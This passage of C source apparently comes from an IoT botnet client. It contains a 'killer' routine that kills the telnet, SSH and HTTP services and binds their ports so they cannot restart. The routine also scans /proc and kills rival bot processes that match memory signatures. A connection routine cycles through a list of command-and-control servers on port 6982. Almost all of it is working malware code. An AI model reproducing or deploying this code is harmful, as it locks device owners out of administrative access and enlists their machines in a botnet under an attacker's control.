  while(in < end) *(out++) = LOOKUP[*(in++)] << 4 | LOOKUP[*(in++)];
}

// array of known bot signatures in hexadecimal format
char *knownBots[] = {
    // list of known bots
    // each string is a hexadecimal representation of a bot signature
};

// checks if a specific memory buffer contains any known bot signatures
int mem_exists(char *buf, int buf_len, char *str, int str_len) {
    int matches = 0;

    if (str_len > buf_len)
        return 0;

    while (buf_len--) {
        if (*buf++ == str[matches]) {
            if (++matches == str_len)
                return 1;
        } else
            matches = 0;
    }

    return 0;
}

int killer_pid;
char *killer_realpath;
int killer_realpath_len = 0;

// checks if the process has access to its own executable path
int has_exe_access(void) {
    char path[PATH_MAX], *ptr_path = path, tmp[16];
    int fd, k_rp_len;

    // construct the path to /proc/$pid/exe
    ptr_path += util_strcpy(ptr_path, "/proc/");
    ptr_path += util_strcpy(ptr_path, util_itoa(getpid(), 10, tmp));
    ptr_path += util_strcpy(ptr_path, "/exe");

    // attempt to open the file
    if ((fd = open(path, O_RDONLY)) == -1) {
        return 0;
    }
    close(fd);

    // read the symbolic link to get the real path of the process
    if ((k_rp_len = readlink(path, killer_realpath, PATH_MAX - 1)) != -1) {
        killer_realpath[k_rp_len] = 0;
    }

    util_zero(path, ptr_path - path);

    return 1;
}

// matches memory signatures against known bots
int memory_j83j_match(char *path) {
    int fd, ret;
    char rdbuf[4096];
    int found = 0;
    int i;
    if ((fd = open(path, O_RDONLY)) == -1) return 0;
    unsigned char searchFor[64];
    util_zero(searchFor, sizeof(searchFor));

    while ((ret = read(fd, rdbuf, sizeof (rdbuf))) > 0) {
        for (i = 0; i < NUMITEMS(knownBots); i++) {
            hex2bin(knownBots[i], util_strlen(knownBots[i]), searchFor);
            if (mem_exists(rdbuf, ret, searchFor, util_strlen(searchFor))) {
                found = 1;
                break;
            }
            util_zero(searchFor, sizeof(searchFor));
        }
    }

    close(fd);

    return found;
}
#define KILLER_MIN_PID              1000
#define KILLER_RESTART_SCAN_TIME    1

// killer function that scans and kills certain processes
void killer_xywz(int parentpid)
{
    int killer_highest_pid = KILLER_MIN_PID, last_pid_j83j = time(NULL), tmp_bind_fd;
    uint32_t j83j_counter = 0;
    struct sockaddr_in tmp_bind_addr;

    // let parent continue on main thread
    killer_pid = fork();
    if (killer_pid > 0 || killer_pid == -1)
        return;

    tmp_bind_addr.sin_family = AF_INET;
    tmp_bind_addr.sin_addr.s_addr = INADDR_ANY;

#ifdef KILLER_REBIND_TELNET
    // kill telnet service and prevent it from restarting
    killer_kill_by_port(HTONS(23));
    
    tmp_bind_addr.sin_port = HTONS(23);

    if ((tmp_bind_fd = socket(AF_INET, SOCK_STREAM, 0)) != -1)
    {
        bind(tmp_bind_fd, (struct sockaddr *)&tmp_bind_addr, sizeof (struct sockaddr_in));
        listen(tmp_bind_fd, 1);
    }
#endif

#ifdef KILLER_REBIND_SSH
    // kill ssh service and prevent it from restarting
    killer_kill_by_port(HTONS(22));
    
    tmp_bind_addr.sin_port = HTONS(22);

    if ((tmp_bind_fd = socket(AF_INET, SOCK_STREAM, 0)) != -1)
    {
        bind(tmp_bind_fd, (struct sockaddr *)&tmp_bind_addr, sizeof (struct sockaddr_in));
        listen(tmp_bind_fd, 1);
    }
#endif

#ifdef KILLER_REBIND_HTTP
    // kill http service and prevent it from restarting
    killer_kill_by_port(HTONS(80));
    tmp_bind_addr.sin_port = HTONS(80);

    if ((tmp_bind_fd = socket(AF_INET, SOCK_STREAM, 0)) != -1)
    {
        bind(tmp_bind_fd, (struct sockaddr *)&tmp_bind_addr, sizeof (struct sockaddr_in));
        listen(tmp_bind_fd, 1);
    }
#endif

    // check for executable access and get real path
    killer_realpath = malloc(PATH_MAX);
    killer_realpath[0] = 0;
    killer_realpath_len = 0;

    if (!has_exe_access())
    {
        return;
    }

    while (1)
    {
        DIR *dir;
        struct dirent *file;
        if ((dir = opendir("/proc/")) == NULL)
        {
            break;
        }
        while ((file = readdir(dir)) != NULL)
        {
            // skip non-pid folders
            if (*(file->d_name) < '0' || *(file->d_name) > '9')
                continue;

            char exe_path[64], realpath[PATH_MAX];
            char status_path[64];
            int rp_len, fd, pid = atoi(file->d_name);
            j83j_counter++;

            // skip certain pids
            if (pid <= killer_highest_pid && pid != parentpid || pid != getpid())
            {
                if (time(NULL) - last_pid_j83j > KILLER_RESTART_SCAN_TIME)
                    killer_highest_pid = KILLER_MIN_PID;
                else if (pid > KILLER_MIN_PID && j83j_counter % 10 == 0)
                    sleep(1); // sleep to wait for process spawn

                continue;
            }
            if (pid > killer_highest_pid)
                killer_highest_pid = pid;
            last_pid_j83j = time(NULL);

            // construct paths
            snprintf(exe_path, sizeof(exe_path), "/proc/%d/exe", pid);
            snprintf(status_path, sizeof(status_path), "/proc/%d/status", pid);

            // read the link of exe_path
            if ((rp_len = readlink(exe_path, realpath, sizeof(realpath) - 1)) != -1)
            {
                realpath[rp_len] = 0; // null-terminate realpath

                // skip certain files
                if (pid == getpid() || pid == getppid() || util_strcmp(realpath, killer_realpath))
                    continue;

                if ((fd = open(realpath, O_RDONLY)) == -1)
                {
                    kill(pid, 9);
                }
                close(fd);
            }

            // check memory for known bots
            if (memory_j83j_match(exe_path))
            {
                kill(pid, 9);
            } 

            // clear path buffers
            util_zero(exe_path, sizeof(exe_path));
            util_zero(status_path, sizeof(status_path));

            sleep(1);
        }

        closedir(dir);
    }
}

/**
 * etablishes connection to the next server in the list
 * cycles through a list of servers and attempts to connect to each using a timeout
 * 
 * @return 1 on successful connection, 0 on failure.
 */
int initConnection()
{
    unsigned char server[512];
    memset(server, 0, sizeof(server)); // clear server buffer

    // close existing socket if it's open
    if (mainCommSock) { 
        close(mainCommSock); 
        mainCommSock = 0; 
    }

    // cycle through server list
    if (currentServer + 1 == SERVER_LIST_SIZE) 
        currentServer = 0;
    else 
        currentServer++;

    // copy next server address
    strcpy(server, agagag[currentServer]);

    // default port number
    int port = 6982;

    // check if a specific port is specified in the server address
    char *portPtr = strchr(server, ':');
    if (portPtr != NULL) {
        port = atoi(portPtr + 1);
        *portPtr = '\0'; // split the string at the colon to isolate the IP address
    }

    // create TCP socket
    mainCommSock = socket(AF_INET, SOCK_STREAM, 0);
    if (mainCommSock < 0) {
        perror("Socket creation failed");
        return 0;
    }

    // connect with a timeout
    if (!connectTimeout(mainCommSock, server, port, 30)) {
        close(mainCommSock); // Close the socket if the connection fails
        return 0;
    }

    return 1; // connection successful
}

